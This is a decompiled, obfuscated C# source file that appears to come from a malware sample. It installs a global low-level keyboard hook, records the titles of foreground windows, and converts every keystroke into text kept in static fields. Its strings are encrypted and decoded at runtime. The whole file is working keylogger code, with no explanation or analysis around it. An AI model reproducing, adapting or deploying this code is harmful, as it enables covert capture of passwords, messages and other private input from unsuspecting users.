using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

internal class Class9
{
	private delegate int Delegate0(int int_0, int int_1, ref Struct5 struct5_0);

	public struct Struct5
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;
	}

	private string string_0;

	private static IntPtr intptr_0 = (IntPtr)0;

	private static string string_1 = "";

	private static Delegate0 delegate0_0 = null;

	public static string smethod_0(IntPtr intptr_1)
	{
		string result = default(string);
		try
		{
			if (intptr_1.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = GetWindowTextLength(intptr_1);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			GetWindowTextA((int)intptr_1, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_1()
	{
		try
		{
			delegate0_0 = smethod_2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			intptr_0 = (IntPtr)SetWindowsHookExA(13, delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int int_0, Delegate0 delegate0_1, int int_1, int int_2);

	public static int smethod_2(int int_0, int int_1, ref Struct5 struct5_0)
	{
		try
		{
			string text = smethod_0(GetForegroundWindow());
			if (Operators.CompareString(text, string_1, false) != 0)
			{
				string_1 = text;
				Class5.string_12 = Class5.string_12 + Environment.NewLine + Class6.smethod_0("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + " " + text + " " + Class6.smethod_0("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			Thread.Sleep(10);
			string text2 = "";
			if (int_1 == 256 || int_1 == 260)
			{
				checked
				{
					switch (struct5_0.int_0)
					{
					case 8:
						Class5.string_12 = Class5.string_12.Substring(0, Class5.string_12.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 18:
						text2 = Class6.smethod_0("W7Gi1M6Ydg0=", "False");
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? Class6.smethod_0("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : Class6.smethod_0("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = Class6.smethod_0("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = Class6.smethod_0("RyA=", "False");
						break;
					case 33:
						text2 = Class6.smethod_0("Zbu708uqtdvPhAE=", "False");
						break;
					case 34:
						text2 = Class6.smethod_0("VKqqwrqZk8nYwZFvFA==", "False");
						break;
					case 35:
						text2 = Class6.smethod_0("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = Class6.smethod_0("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = Class6.smethod_0("U6mVvXIT", "False");
						break;
					case 38:
						text2 = Class6.smethod_0("SJ6ssmce", "False");
						break;
					case 39:
						text2 = Class6.smethod_0("X7WjyX4H", "False");
						break;
					case 40:
						text2 = Class6.smethod_0("O5GXpVor", "False");
						break;
					case 46:
						text2 = Class6.smethod_0("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = Class6.smethod_0("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(Class6.smethod_0("VBM=", "False")) });
							switch (struct5_0.int_0)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(struct5_0.int_0);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(struct5_0.int_0 + 32).ToLower() : char.ConvertFromUtf32(struct5_0.int_0 + 32).ToUpper());
						break;
					case 91:
					case 92:
						text2 = Class6.smethod_0("Q5mgubBls73EsZGbaSY=", "False");
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = Class6.smethod_0("UaedGA==", "False") + Conversions.ToString(struct5_0.int_0 - 111) + Class6.smethod_0("o4EC", "False");
						break;
					case 144:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_NumLock()) ? Class6.smethod_0("ZLq45tCQzs3cg5PNx5EG", "False") : Class6.smethod_0("SZ+dy7V1s7LBaHiqtbNoHQ==", "False"));
						break;
					case 16:
					case 160:
					case 161:
						text2 = "";
						break;
					case 162:
					case 163:
						text2 = Class6.smethod_0("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = Class6.smethod_0("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("cBI=", "False") : Class6.smethod_0("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("WSs=", "False") : Class6.smethod_0("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("YhE=", "False") : Class6.smethod_0("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("cAQ=", "False") : Class6.smethod_0("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("ZRA=", "False") : Class6.smethod_0("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("aQ0=", "False") : Class6.smethod_0("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("lBM=", "False") : Class6.smethod_0("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(struct5_0.int_0);
						break;
					case 219:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("mgg=", "False") : Class6.smethod_0("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("czA=", "False") : Class6.smethod_0("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("gSM=", "False") : Class6.smethod_0("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class6.smethod_0("bQE=", "False") : Class6.smethod_0("Ths=", "False"));
						break;
					}
					Class5.string_12 += text2;
					Class5.string_31 = Class5.string_12;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int int_0, StringBuilder stringBuilder_0, int int_1);

	public Class9(string string_2)
	{
		try
		{
			string_0 = string_2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
